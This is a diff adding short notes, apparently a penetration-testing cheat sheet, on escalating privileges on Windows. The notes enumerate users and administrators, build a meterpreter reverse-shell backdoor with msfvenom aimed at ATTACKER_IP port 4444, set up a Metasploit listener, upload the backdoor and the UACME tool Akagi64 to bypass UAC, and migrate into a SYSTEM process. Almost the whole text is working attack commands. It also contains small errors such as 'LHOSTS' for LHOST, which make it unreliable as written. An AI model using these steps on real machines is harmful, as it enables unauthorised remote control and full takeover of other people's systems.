@@ -1,0 +1,28 @@
+- list all users : 
+    - net users
+- List all administrators user
+    - net localgroup administrators
+
+- msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=ATTACKER_IP LPORT=4444 -f exe -o backdoor.exe 
+- msfconsole
+- use multi/handler
+- set payload windows/meterpreter/reverse_tcp
+- set LHOSTS ATTACKER_IP
+- set LPORT 4444
+- run
+- in another meterpreter session : 
+    - getuid
+    - getprivs
+    - cd C:\\
+    - mkdir Temp
+    - cd Temp
+    - upload backdoor.exe
+    - upload Akagi64.exe
+    - shell
+    - .\Akagi64.exe UACME_NUMBER PathToThe\backdoor.exe
+        - most of the time : .\Akagi64.exe 23 C:\Temp\backdoor.exe
+- in the lister, a meterpreter session with more privileges will be prompted
+- ps
+- switch to a NT AUTHORITY\SYSTEM process
+    - migrate PROCESS_ID
+- this gives a meterpreter session with SYSTEM privileges
